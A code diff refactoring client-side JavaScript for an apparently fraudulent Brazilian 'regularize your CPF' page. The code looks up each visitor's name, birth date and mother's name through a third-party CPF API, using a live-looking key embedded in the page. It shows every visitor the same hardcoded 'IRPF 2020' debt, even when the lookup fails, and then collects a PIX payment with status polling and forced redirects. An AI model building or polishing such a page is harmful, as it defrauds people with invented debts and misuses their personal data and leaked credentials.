@@ -20,14 +20,304 @@ function buildUrlWithParams(baseUrl) {
     return url.toString();
 }
 
-// Save customer data to localStorage if flag is set
+// ==========================================
+// SISTEMA ROBUSTO DE CONSULTA DE CPF
+// ==========================================
 
+/**
+ * Utilitários de log detalhados
+ */
+function logPasso(passo, mensagem, dados = {}) {
+    const timestamp = new Date().toISOString();
+    console.log(`[${passo}] ${mensagem}`, { ...dados, timestamp });
+}
 
+function logErro(tipoErro, mensagem, erro = null, dados = {}) {
+    const timestamp = new Date().toISOString();
+    console.error(`[ERRO:${tipoErro}] ${mensagem}`, { erro, dados, timestamp });
+}
+
+/**
+ * Validação matemática do CPF
+ */
+function isValidCPF(cpf) {
+    if (!cpf || cpf.length !== 11) return false;
+    if (/^(\d)\1{10}$/.test(cpf)) return false;
+    
+    let sum = 0;
+    for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
+    let remainder = (sum * 10) % 11;
+    if (remainder === 10) remainder = 0;
+    if (remainder !== parseInt(cpf.charAt(9))) return false;
+    
+    sum = 0;
+    for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
+    remainder = (sum * 10) % 11;
+    if (remainder === 10) remainder = 0;
+    if (remainder !== parseInt(cpf.charAt(10))) return false;
+    
+    return true;
+}
+
+/**
+ * Verifica se o valor é um objeto JSON válido
+ */
+function isJsonObject(value) {
+    return value !== null && typeof value === 'object' && !Array.isArray(value);
+}
+
+/**
+ * Valida a estrutura da resposta da API
+ */
+function isValidRespostaAPI(data) {
+    return (
+        isJsonObject(data) &&
+        typeof data.nome === 'string' &&
+        data.nome.trim().length > 0
+    );
+}
+
+/**
+ * Consulta a API de CPF com retry e timeout
+ */
+async function consultarCPF(cpfValue, tentativa = 1, maxTentativas = 3) {
+    logPasso(`${tentativa}/${maxTentativas}`, 'Iniciando consulta de CPF', { cpf: cpfValue });
+    
+    // ⚠️ AVISO DE SEGURANÇA CRÍTICO:
+    // Este token NÃO DEVE ficar exposto no frontend!
+    // Em produção, crie um backend próprio que faça essa requisição.
+    const TOKEN_API = 'sk_live_dDDrUBdxkA7ANWYp_BZxlWnQw6UNNGPd';
+    const URL_API = `https://search.apisegura.cloud/cpf?token=${TOKEN_API}&cpf=${cpfValue}`;
+    
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 segundos de timeout
+    
+    try {
+        const startTime = Date.now();
+        logPasso(`${tentativa}/${maxTentativas}`, 'Enviando requisição para API', { url: URL_API });
+        
+        const response = await fetch(URL_API, {
+            method: 'GET',
+            signal: controller.signal,
+            headers: { 'Accept': 'application/json' }
+        });
+        
+        const tempoRequisicao = Date.now() - startTime;
+        logPasso(`${tentativa}/${maxTentativas}`, 'Resposta recebida', {
+            status: response.status,
+            statusText: response.statusText,
+            tempo: `${tempoRequisicao}ms`
+        });
+        
+        clearTimeout(timeoutId);
+        
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+        
+        const textoResposta = await response.text();
+        logPasso(`${tentativa}/${maxTentativas}`, 'Conteúdo bruto da resposta', { texto: textoResposta });
+        
+        let data;
+        try {
+            data = JSON.parse(textoResposta);
+            logPasso(`${tentativa}/${maxTentativas}`, 'JSON parseado com sucesso', { data });
+        } catch (jsonErro) {
+            logErro('JSON_INVALIDO', 'Falha ao parsear JSON', jsonErro, { textoResposta });
+            throw new Error('Resposta da API não é um JSON válido');
+        }
+        
+        if (!isValidRespostaAPI(data)) {
+            logErro('ESTRUTURA_INVALIDA', 'Resposta da API não tem estrutura válida', null, { data });
+            throw new Error('Estrutura da resposta inválida');
+        }
+        
+        logPasso(`${tentativa}/${maxTentativas}`, 'Consulta realizada com sucesso!');
+        return data;
+        
+    } catch (erro) {
+        clearTimeout(timeoutId);
+        
+        if (erro.name === 'AbortError') {
+            logErro('TIMEOUT', 'Tempo de requisição excedido (10s)', erro, { tentativa });
+        } else if (erro.message.includes('Failed to fetch') || erro.message.includes('NetworkError')) {
+            logErro('REDE', 'Erro de rede ou CORS', erro, { tentativa });
+        } else if (erro.message.includes('HTTP')) {
+            logErro('HTTP', 'Erro na resposta HTTP', erro, { tentativa });
+        } else {
+            logErro('INDETERMINADO', 'Erro inesperado', erro, { tentativa });
+        }
+        
+        if (tentativa < maxTentativas) {
+            const delayTentativa = tentativa * 1000;
+            logPasso(`${tentativa}/${maxTentativas}`, `Aguardando ${delayTentativa}ms para nova tentativa`);
+            await new Promise(resolve => setTimeout(resolve, delayTentativa));
+            return consultarCPF(cpfValue, tentativa + 1, maxTentativas);
+        }
+        
+        throw erro;
+    }
+}
+
+/**
+ * Salva dados no storage com validação
+ */
+function salvarDados(cpfValue, cpfFormatted, dadosAPI) {
+    logPasso('SALVANDO', 'Preparando dados para salvar', { cpfValue, dadosAPI });
+    
+    const validatedData = {
+        cpf: cpfValue,
+        nomeCompleto: dadosAPI.nome,
+        dataNascimento: dadosAPI.nascimento || '01/01/1990',
+        nomeMae: dadosAPI.nome_mae || 'Não informado'
+    };
+    
+    const customerData = {
+        nome: dadosAPI.nome || 'Usuário',
+        cpf: cpfFormatted,
+        situacao: dadosAPI.situacao_receita || 'REGULAR',
+        data_nascimento: dadosAPI.nascimento || '1990-01-01',
+        nome_mae: dadosAPI.nome_mae || 'Não informado',
+        debitos: [{ tipo: 'IRPF 2020', valor: 101.82, vencimento: '15/12/2024' }]
+    };
+    
+    if (!validatedData.cpf || !validatedData.nomeCompleto) {
+        logErro('DADOS_INCOMPLETOS', 'Dados insuficientes para salvar', null, { validatedData });
+        return false;
+    }
+    
+    try {
+        sessionStorage.setItem('cpfValidatedData', JSON.stringify(validatedData));
+        logPasso('SALVANDO', 'Dados salvos no SessionStorage', { validatedData });
+        
+        localStorage.setItem('customerData', JSON.stringify(customerData));
+        logPasso('SALVANDO', 'Dados salvos no LocalStorage', { customerData });
+        
+        return true;
+    } catch (storageErro) {
+        logErro('STORAGE', 'Falha ao salvar dados no storage', storageErro);
+        return false;
+    }
+}
+
+/**
+ * Fallback com dados mockados
+ */
+function usarFallback(cpfValue, cpfFormatted) {
+    logPasso('FALLBACK', 'Usando dados mockados', { cpfValue, cpfFormatted });
+    
+    const fallbackData = {
+        nome: 'Usuário',
+        nascimento: '1990-01-01',
+        nome_mae: 'Não informado',
+        situacao_receita: 'REGULAR'
+    };
+    
+    const dadosSalvos = salvarDados(cpfValue, cpfFormatted, fallbackData);
+    if (!dadosSalvos) {
+        alert('Erro interno. Tente novamente.');
+        return;
+    }
+    
+    redirecionarParaAdesao();
+}
+
+/**
+ * Redireciona para a página de adesão com validação
+ */
+function redirecionarParaAdesao() {
+    logPasso('REDIRECIONANDO', 'Preparando para redirecionar');
+    
+    const urlDestino = buildUrlWithParams('adesao.html');
+    logPasso('REDIRECIONANDO', 'URL de destino', { urlDestino });
+    
+    window.location.href = urlDestino;
+}
+
+/**
+ * Manipuladores do formulário de CPF
+ */
+function showCpfError(message) {
+    const cpfError = document.getElementById('cpfError');
+    const cpfInput = document.getElementById('cpfInput');
+    cpfInput.style.borderColor = '#dc3545';
+    cpfError.textContent = message;
+    cpfError.style.display = 'block';
+}
+
+function hideCpfError() {
+    const cpfError = document.getElementById('cpfError');
+    const cpfInput = document.getElementById('cpfInput');
+    cpfInput.style.borderColor = '#dee2e6';
+    cpfError.style.display = 'none';
+}
+
+/**
+ * Fluxo principal do formulário de CPF
+ */
+async function handleCPFSubmit(e) {
+    e.preventDefault();
+    logPasso('INICIO', 'Formulário de CPF enviado');
+    
+    hideCpfError();
+    
+    const cpfInput = document.getElementById('cpfInput');
+    const cpfValue = cpfInput.value.replace(/\D/g, '');
+    const cpfFormatted = cpfInput.value;
+    const btn = e.target.querySelector('button[type="submit"]');
+    const originalText = btn.innerHTML;
+    
+    if (cpfValue.length !== 11) {
+        showCpfError('CPF inválido. Digite 11 dígitos.');
+        return;
+    }
+    
+    if (!isValidCPF(cpfValue)) {
+        logErro('VALIDACAO_CPF', 'Validação matemática do CPF falhou', null, { cpfValue });
+        showCpfError('CPF inválido. Verifique os dígitos.');
+        return;
+    }
+    
+    logPasso('VALIDACAO', 'Validação matemática do CPF passou');
+    
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+    document.getElementById('cpfLoading').style.display = 'block';
+    
+    try {
+        const dadosAPI = await consultarCPF(cpfValue);
+        
+        const dadosSalvos = salvarDados(cpfValue, cpfFormatted, dadosAPI);
+        if (!dadosSalvos) {
+            alert('Erro interno. Tente novamente.');
+            return;
+        }
+        
+        cpfInput.style.borderColor = '#28a745';
+        redirecionarParaAdesao();
+        
+    } catch (erro) {
+        logErro('FLUXO_PRINCIPAL', 'Erro no fluxo principal', erro);
+        usarFallback(cpfValue, cpfFormatted);
+        
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = originalText;
+        document.getElementById('cpfLoading').style.display = 'none';
+    }
+}
+
+// ==========================================
+// FIM DO SISTEMA DE CONSULTA DE CPF
+// ==========================================
+
+// Restante das funcionalidades existentes mantidas:
+
+// Video player listener
 document.addEventListener('DOMContentLoaded', function() {
     const video = document.getElementById('newsVideo');
     const soundButton = document.getElementById('soundButton');
 
-    // Only add video event listeners if video and sound button exist
     if (video && soundButton) {
         video.addEventListener('click', function() {
             if (video.paused) {
@@ -56,7 +346,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
-
+// Payment system functions
 let currentTransactionId = null;
 let paymentMonitorInterval = null;
 
@@ -72,24 +362,19 @@ async function generatePayment() {
 
         const response = await fetch('/generate-pix', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            }
+            headers: { 'Content-Type': 'application/json' }
         });
 
         const data = await response.json();
 
         if (data.success && data.pixCode) {
-            // Salvar ID da transação para monitoramento
             currentTransactionId = data.transactionId || data.orderId;
             
-            // Atualizar número do documento com ID da transação
             const docNumber = document.getElementById('documentNumber');
             if (docNumber && currentTransactionId) {
                 docNumber.textContent = currentTransactionId.substring(0, 13).toUpperCase();
             }
             
-            // Gerar QR code a partir do código PIX usando uma biblioteca externa
             const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
             document.getElementById('qrCodeImage').src = qrCodeUrl;
             document.getElementById('pixCode').textContent = data.pixCode;
@@ -97,8 +382,6 @@ async function generatePayment() {
             loaderContainer.style.display = 'none';
             qrCodeContainer.style.display = 'block';
             startPixCountdown();
-            
-            // Iniciar monitoramento do pagamento
             startPaymentMonitoring();
         } else {
             throw new Error(data.error || 'Erro ao gerar o pagamento');
@@ -121,7 +404,6 @@ function startPaymentMonitoring() {
 
     console.log(`Iniciando monitoramento do pagamento: ${currentTransactionId}`);
     
-    // Verificar status a cada 3 segundos
     paymentMonitorInterval = setInterval(async () => {
         try {
             console.log(`🔍 Verificando status da transação: ${currentTransactionId}`);
@@ -131,39 +413,28 @@ function startPaymentMonitoring() {
             console.log('📊 Resposta completa do status:', statusData);
             console.log(`🎯 Status: ${statusData.status}, Success: ${statusData.success}`);
             
-            // Se o pagamento foi confirmado
             if (statusData.success && statusData.status === 'paid') {
                 console.log('🎉 PAGAMENTO CONFIRMADO! Iniciando redirecionamento para /aviso...');
                 
-                // Parar o monitoramento
                 clearInterval(paymentMonitorInterval);
                 console.log('⏹️ Monitoramento interrompido');
                 
-                // Fechar modal
                 document.getElementById('paymentModal').style.display = 'none';
                 console.log('❌ Modal fechado');
                 
-                // Redirecionar para /aviso
-                console.log('🔄 Redirecionando para /aviso...');
-                
-                // Tentar diferentes métodos de redirecionamento com params preservados
                 const avisoUrl = buildUrlWithParams('aviso.html');
                 try {
-                    // Método 1: window.location.href
                     window.location.href = avisoUrl;
                 } catch (e1) {
                     console.error('Erro no método 1:', e1);
                     try {
-                        // Método 2: window.location.replace
                         window.location.replace(avisoUrl);
                     } catch (e2) {
                         console.error('Erro no método 2:', e2);
                         try {
-                            // Método 3: window.location.assign
                             window.location.assign(avisoUrl);
                         } catch (e3) {
                             console.error('Erro no método 3:', e3);
-                            // Método 4: link manual
                             const link = document.createElement('a');
                             link.href = avisoUrl;
                             link.click();
@@ -176,31 +447,21 @@ function startPaymentMonitoring() {
         } catch (error) {
             console.error('❌ Erro ao verificar status do pagamento:', error);
         }
-    }, 3000); // Verificar a cada 3 segundos
+    }, 3000);
     
-    // Timeout de 5 minutos para redirecionamento forçado (backup)
     setTimeout(() => {
         console.log('🕐 Timeout de 5 minutos atingido - verificando se deve redirecionar...');
-        
-        // Se ainda estiver monitorando, tentar um redirecionamento forçado
         if (paymentMonitorInterval && currentTransactionId) {
             console.log('⚠️ Executando redirecionamento de backup após 5 minutos...');
-            
-            // Parar o monitoramento
             clearInterval(paymentMonitorInterval);
-            
-            // Fechar modal
             document.getElementById('paymentModal').style.display = 'none';
-            
-            // Mostrar alerta e redirecionar
             alert('Verificando seu pagamento...');
             setTimeout(() => {
                 window.location.href = buildUrlWithParams('aviso.html');
             }, 1000);
         }
-    }, 5 * 60 * 1000); // 5 minutos
+    }, 5 * 60 * 1000);
     
-    // Parar monitoramento após 20 minutos (tempo limite do PIX)
     setTimeout(() => {
         if (paymentMonitorInterval) {
             clearInterval(paymentMonitorInterval);
@@ -217,43 +478,31 @@ function copyPixCode() {
         copyButton.classList.add('copy-success');
         copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
         
-        // Aguardar 4 segundos antes de fechar o modal e mostrar o de aguardando
         setTimeout(() => {
-            // Fechar o modal do PIX
             document.getElementById('paymentModal').style.display = 'none';
-            
-            // Mostrar o modal de aguardando pagamento
             showWaitingPaymentModal();
-            
-            // Restaurar o texto original do botão
             copyButton.classList.remove('copy-success');
             copyButton.innerHTML = '<i class="fas fa-copy"></i> COPIAR CÓDIGO PIX PARA PAGAMENTO';
-        }, 4000); // 4 segundos
-        
+        }, 4000);
     }).catch(err => {
         console.error('Erro ao copiar:', err);
     });
 }
 
 function showWaitingPaymentModal() {
-    // Mostrar o modal
     document.getElementById('waitingPaymentModal').style.display = 'block';
-    
-    // Copiar o código PIX para o modal de aguardando
     const pixCode = document.getElementById('pixCode').textContent;
     document.getElementById('waitingPixCode').textContent = pixCode;
     
-    // Configurar o botão para alterar texto após 3 segundos
     setTimeout(() => {
         const waitingButton = document.getElementById('waitingCopyButton');
         waitingButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
-    }, 3000); // 3 segundos
+    }, 3000);
     
-    // Após 40 segundos, mostrar o botão "Realizei o pagamento"
     setTimeout(() => {
         document.getElementById('waitingContainer').style.display = 'none';
         document.getElementById('paymentCompletedContainer').style.display = 'block';
-    }, 40000); // 40 segundos
+    }, 40000);
 }
 
 function copyWaitingPixCode() {
@@ -262,22 +511,16 @@ function copyWaitingPixCode() {
 
     navigator.clipboard.writeText(pixCode).then(() => {
         copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado';
-        
-        // Após 3 segundos, mudar para "Copiar código PIX"
         setTimeout(() => {
             copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
-        }, 3000); // 3 segundos
-        
+        }, 3000);
     }).catch(err => {
         console.error('Erro ao copiar:', err);
     });
 }
 
 function redirectToAviso() {
-    // Fechar modal
     document.getElementById('waitingPaymentModal').style.display = 'none';
-    
-    // Redirecionar para /aviso
     window.location.href = buildUrlWithParams('aviso.html');
 }
 
@@ -297,14 +540,13 @@ function startPixCountdown() {
         } else {
             seconds--;
         }
-
         const minutesStr = minutes.toString().padStart(2, '0');
         const secondsStr = seconds.toString().padStart(2, '0');
         countdownElement.innerHTML = `<i class="fas fa-clock"></i> Prazo de pagamento expira em: ${minutesStr}:${secondsStr}`;
     }, 1000);
 }
 
-// Adicionar evento de clique no botão "Regularize agora"
+// CPF Form Initialization
 document.addEventListener('DOMContentLoaded', function() {
     const regularizeButton = document.querySelector('.regularize-button');
     if (regularizeButton) {
@@ -313,244 +555,52 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // CPF form handling
     const cpfForm = document.getElementById('cpfForm');
     if (cpfForm) {
         const cpfInput = document.getElementById('cpfInput');
         
-        // Format CPF as user types
         cpfInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             value = value.replace(/(\d{3})(\d)/, '$1.$2');
             value = value.replace(/(\d{3})(\d)/, '$1.$2');
             value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
             e.target.value = value;
-        });
-        
-        // CPF digit verification (standard algorithm)
-        function isValidCPF(cpf) {
-            if (!cpf || cpf.length !== 11) return false;
-            // Reject all same-digit CPFs
-            if (/^(\d)\1{10}$/.test(cpf)) return false;
-
-            // Validate first check digit
-            let sum = 0;
-            for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
-            let remainder = (sum * 10) % 11;
-            if (remainder === 10) remainder = 0;
-            if (remainder !== parseInt(cpf.charAt(9))) return false;
-
-            // Validate second check digit
-            sum = 0;
-            for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
-            remainder = (sum * 10) % 11;
-            if (remainder === 10) remainder = 0;
-            if (remainder !== parseInt(cpf.charAt(10))) return false;
-
-            return true;
-        }
-
-        // Show error on CPF field
-        function showCpfError(message) {
-            const cpfError = document.getElementById('cpfError');
-            const cpfInput = document.getElementById('cpfInput');
-            cpfInput.style.borderColor = '#dc3545';
-            cpfError.textContent = message;
-            cpfError.style.display = 'block';
-        }
-
-        // Hide error on CPF field
-        function hideCpfError() {
-            const cpfError = document.getElementById('cpfError');
-            const cpfInput = document.getElementById('cpfInput');
-            cpfInput.style.borderColor = '#dee2e6';
-            cpfError.style.display = 'none';
-        }
-
-        // Função de fallback para usar dados mockados
-        function usarFallback(cpfValue, cpfFormatted) {
-            console.log('🎯 EVENTO: Usando fallback de dados');
-            
-            const validatedData = {
-                cpf: cpfValue,
-                nomeCompleto: 'Usuário',
-                dataNascimento: '01/01/1990',
-                nomeMae: 'Não informado'
-            };
-            sessionStorage.setItem('cpfValidatedData', JSON.stringify(validatedData));
-            
-            console.log('💾 Dados validados (fallback) salvos no sessionStorage:', validatedData);
-
-            const customerData = {
-                nome: 'Usuário',
-                cpf: cpfFormatted,
-                situacao: 'REGULAR',
-                data_nascimento: '1990-01-01', // Formato da API (YYYY-MM-DD)
-                nome_mae: 'Não informado',
-                debitos: [{ tipo: 'IRPF 2020', valor: 101.82, vencimento: '15/12/2024' }]
-            };
-            localStorage.setItem('customerData', JSON.stringify(customerData));
-            
-            console.log('💾 Dados do cliente (fallback) salvos no localStorage:', customerData);
-
-            hideCpfError();
-            document.getElementById('cpfInput').style.borderColor = '#28a745';
-            
-            console.log('🔄 Redirecionando para adesao.html...');
-            window.location.href = buildUrlWithParams('adesao.html');
-        }
-
-        // Hide error when user starts editing again
-        cpfInput.addEventListener('focus', function() {
-            hideCpfError();
-        });
-
-        // Clear stored CPF data when editing
-        cpfInput.addEventListener('input', function() {
             sessionStorage.removeItem('cpfValidatedData');
         });
-
-        // Handle form submission
-        cpfForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            console.log('🎯 EVENTO: Formulário de CPF enviado');
-
-            hideCpfError();
-
-            const cpfValue = cpfInput.value.replace(/\D/g, '');
-            console.log('📝 CPF digitado:', cpfValue);
-            
-            if (cpfValue.length !== 11) {
-                showCpfError('CPF inválido. Digite 11 dígitos.');
-                return;
-            }
-
-            // Step 1: Local math validation
-            if (!isValidCPF(cpfValue)) {
-                console.warn('❌ Validação matemática do CPF falhou');
-                showCpfError('CPF inválido. Verifique os dígitos.');
-                return;
-            }
-            
-            console.log('✅ Validação matemática do CPF passou');
-
-            const btn = e.target.querySelector('button[type="submit"]');
-            const originalText = btn.innerHTML;
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
-            document.getElementById('cpfLoading').style.display = 'block';
-
-            try {
-                console.log('🔍 Tentando consultar CPF na API...');
-                
-                // Step 2: Call external API usando a documentação com proxy CORS para evitar erro
-                const proxyUrl = 'https://api.allorigins.win/get?url=';
-                const apiUrl = encodeURIComponent(`https://search.apisegura.cloud/cpf?token=sk_live_dDDrUBdxkA7ANWYp_BZxlWnQw6UNNGPd&cpf=${cpfValue}`);
-                
-                console.log('📤 Requisição para:', proxyUrl + apiUrl);
-                
-                const response = await fetch(proxyUrl + apiUrl);
-                
-                // O proxy retorna os dados no campo contents
-                const proxyData = await response.json();
-                console.log('📥 Resposta do proxy:', proxyData);
-                
-                const data = JSON.parse(proxyData.contents);
-                console.log('📋 Dados da API via proxy:', data);
-
-                // Verificar se a API retornou dados válidos
-                if (data && data.nome) {
-                    console.log('✅ Dados do CPF encontrados na API');
-                    
-                    // Save validated data for downstream use
-                    const validatedData = {
-                        cpf: cpfValue,
-                        nomeCompleto: data.nome,
-                        dataNascimento: data.nascimento || '',
-                        nomeMae: data.nome_mae || ''
-                    };
-                    sessionStorage.setItem('cpfValidatedData', JSON.stringify(validatedData));
-                    
-                    console.log('💾 Dados validados salvos no sessionStorage:', validatedData);
-
-                    // Save legacy customerData for downstream pages
-                    const customerData = {
-                        nome: data.nome || 'Usuário',
-                        cpf: cpfInput.value,
-                        situacao: data.situacao_receita || 'REGULAR',
-                        data_nascimento: data.nascimento || '',
-                        nome_mae: data.nome_mae || '',
-                        debitos: [{ tipo: 'IRPF 2020', valor: 101.82, vencimento: '15/12/2024' }]
-                    };
-                    localStorage.setItem('customerData', JSON.stringify(customerData));
-                    
-                    console.log('💾 Dados do cliente salvos no localStorage:', customerData);
-
-                    // Clear any visible error and proceed
-            hideCpfError();
-            cpfInput.style.borderColor = '#28a745';
-            
-            console.log('🔄 Redirecionando para adesao.html...');
-            window.location.href = buildUrlWithParams('adesao.html');
-                } else {
-                    // Fallback: se CPF não for encontrado na API, usar dados mockados
-                    console.warn('⚠️ CPF não encontrado na API, usando fallback');
-                    usarFallback(cpfValue, cpfInput.value);
-                }
-            } catch (err) {
-                // Fallback: se a API falhar, usar dados mockados para permitir o usuário continuar
-                console.error('💥 API de CPF falhou, usando fallback:', err);
-                usarFallback(cpfValue, cpfInput.value);
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = originalText;
-                document.getElementById('cpfLoading').style.display = 'none';
-            }
-        });
+        
+        cpfInput.addEventListener('focus', hideCpfError);
+        cpfForm.addEventListener('submit', handleCPFSubmit);
     }
 });
-// Fechar modal ao clicar fora
+
+// Modal click outside handler
 window.onclick = function(event) {
     const paymentModal = document.getElementById('paymentModal');
     const waitingModal = document.getElementById('waitingPaymentModal');
-    
-    if (event.target == paymentModal) {
-        paymentModal.style.display = 'none';
-    }
-    
-    if (event.target == waitingModal) {
-        waitingModal.style.display = 'none';
-    }
+    if (event.target == paymentModal) paymentModal.style.display = 'none';
+    if (event.target == waitingModal) waitingModal.style.display = 'none';
 }
 
-// Função para confirmar os dados do usuário
 function confirmData() {
-    // Scroll para baixo para mostrar as informações de débito
     const debtorInfo = document.querySelector('.user-info:nth-of-type(2)');
-    if (debtorInfo) {
-        debtorInfo.scrollIntoView({ behavior: 'smooth', block: 'start' });
-    }
+    if (debtorInfo) debtorInfo.scrollIntoView({ behavior: 'smooth', block: 'start' });
 }
 
-// Only show loading screen on CPF routes
+// Loading screen handler
 document.addEventListener('DOMContentLoaded', function() {
     const currentPath = window.location.pathname;
-    const isCpfRoute = /^\/\d{11}$/.test(currentPath); // Matches /11digits
+    const isCpfRoute = /^\/\d{11}$/.test(currentPath);
     
     if (isCpfRoute) {
-        // Show loading screen for 4 seconds
         setTimeout(function() {
             document.getElementById('loadingScreen').style.display = 'none';
             document.getElementById('mainContent').classList.add('show');
         }, 4000);
     } else {
-        // Hide loading screen immediately for other pages
         document.getElementById('loadingScreen').style.display = 'none';
         document.getElementById('mainContent').classList.add('show');
     }
     
-    // Set current date in Brazilian format
     const today = new Date();
     const dateOptions = { 
         day: '2-digit', 
@@ -565,6 +615,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
+// Sidebar handler
 document.addEventListener('DOMContentLoaded', function() {
     const menuToggle = document.querySelector('.movebrasil-hamburger');
     const sidebar = document.getElementById('sidebar');
@@ -583,9 +634,7 @@ document.addEventListener('DOMContentLoaded', function() {
         document.body.style.overflow = '';
     }
 
-    if (menuToggle) {
-        menuToggle.addEventListener('click', openSidebar);
-    }
+    if (menuToggle) menuToggle.addEventListener('click', openSidebar);
     if (closeBtn) closeBtn.addEventListener('click', closeSidebar);
     if (overlay) overlay.addEventListener('click', closeSidebar);
 
